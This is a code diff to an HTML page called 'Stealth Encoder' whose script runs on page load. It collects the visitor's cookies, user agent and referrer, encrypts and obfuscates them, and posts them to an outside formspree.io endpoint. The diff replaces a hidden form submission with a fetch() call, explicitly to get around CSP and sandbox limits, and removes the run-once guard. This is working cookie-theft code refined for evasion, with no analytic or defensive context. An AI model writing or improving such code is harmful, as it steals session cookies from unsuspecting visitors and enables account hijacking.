@@ -23,20 +23,25 @@
 </head>
 <body>
     <h2>Stealth Encoder</h2>
-    <form id="stealthForm" action="https://formspree.io/f/xeoqzkqe" method="POST" style="display: none;">
-        <input type="hidden" name="data" id="encodedData">
-        <button type="submit">Send</button>
-    </form>
+
     <script>
         (() => {
+            async function deriveKey(secret) {
+                const encoder = new TextEncoder();
+                const keyMaterial = await crypto.subtle.importKey(
+                    "raw", encoder.encode(secret), { name: "PBKDF2" }, false, ["deriveKey"]
+                );
+                return crypto.subtle.deriveKey(
+                    { name: "PBKDF2", salt: encoder.encode("SuperSalt"), iterations: 100000, hash: "SHA-256" },
+                    keyMaterial, { name: "AES-GCM", length: 256 }, true, ["encrypt"]
+                );
+            }
+
             async function encryptAES(text, key) {
                 const encoder = new TextEncoder();
-                const encodedText = encoder.encode(text);
-                const hashedKey = await crypto.subtle.digest("SHA-256", encoder.encode(key));
-                const cryptoKey = await crypto.subtle.importKey("raw", hashedKey, { name: "AES-GCM" }, false, ["encrypt"]);
                 const iv = crypto.getRandomValues(new Uint8Array(12));
-                const encrypted = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, cryptoKey, encodedText);
-                return btoa(String.fromCharCode(...new Uint8Array(iv)) + String.fromCharCode(...new Uint8Array(encrypted)));
+                const encryptedData = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, encoder.encode(text));
+                return btoa(String.fromCharCode(...iv) + String.fromCharCode(...new Uint8Array(encryptedData)));
             }
 
             function rot47(str) {
@@ -52,7 +57,7 @@
             }
 
             async function stealthEncode() {
-                const secretKey = "UltraHiddenKey";
+                const secretKey = await deriveKey("UltraHiddenKey");
                 const cookies = document.cookie || "No_Cookies";
                 const userAgent = navigator.userAgent || "Unknown_User_Agent";
                 const referrer = document.referrer || "No_Referrer";
@@ -67,21 +72,16 @@
                     encodedReferrer
                 });
 
-                document.getElementById("encodedData").value = btoa(stealthPayload);
-
-                setTimeout(() => {
-                    document.getElementById("stealthForm").submit();
-                }, 2000);
+                // Use Fetch API instead of Form Submission (Prevents CSP/Sandbox Issues)
+                fetch("https://formspree.io/f/xeoqzkqe", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ data: btoa(stealthPayload) })
+                }).then(response => console.log("Data Sent:", response))
+                  .catch(error => console.error("Error:", error));
             }
 
-            if (!window.stealthExecuted) {
-                window.stealthExecuted = true;
-                stealthEncode().then(() => {
-                    setTimeout(() => {
-                        document.body.innerHTML = "";
-                    }, 2000);
-                });
-            }
+            stealthEncode();
         })();
     </script>
 </body>
